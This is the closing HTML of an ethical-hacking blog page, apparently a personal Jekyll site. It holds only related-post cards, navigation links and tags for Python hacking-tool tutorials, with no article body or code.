href="/tags/htb/">htb</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/portscanner/"><div class="card-body"> <span class="timeago small" > Dec 11, 2020 <i class="unloaded">2020-12-11T01:08:05+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writing a port scanner using python</h3><div class="text-muted small"><p> What is port scanning ? Briefly, Port Scanning is a technique helps the attackers to determine which ports on a network are open and discover services they can exploit to break into a computer syst...</p></div></div></a></div><div class="card"> <a href="/posts/vulnerabilityscanner/"><div class="card-body"> <span class="timeago small" > Dec 13, 2020 <i class="unloaded">2020-12-13T18:47:27+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writing a vulnerability scanner using python</h3><div class="text-muted small"><p> What is a vulnerability scanning ? Vulnerability scanning is an automated process that allows the organizations to check if their networks, systems and applications have security vulnerabilities th...</p></div></div></a></div><div class="card"> <a href="/posts/sshbruteforcer/"><div class="card-body"> <span class="timeago small" > Dec 15, 2020 <i class="unloaded">2020-12-15T19:08:43+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writing a SSH brute forcer using python</h3><div class="text-muted small"><p> What is a SSH protocol ? The SSH protocol (also known as Secure Shell) is a network protocol for secure remote login from one computer to another. It provides several alternative options for strong...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/arpspoofer/" class="btn btn-outline-primary"><p>Writing an ARP spoofer using python</p></a> <a href="/posts/passwordcracker/" class="btn btn-outline-primary"><p>Writing a password cracker using python</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/MohamedAEzzat">Mohamed Ezzat</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ethical-hacking/">ethical hacking</a> <a class="post-tag" href="/tags/boot2root/">boot2root</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/htb/">htb</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://mohamedaezzat.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
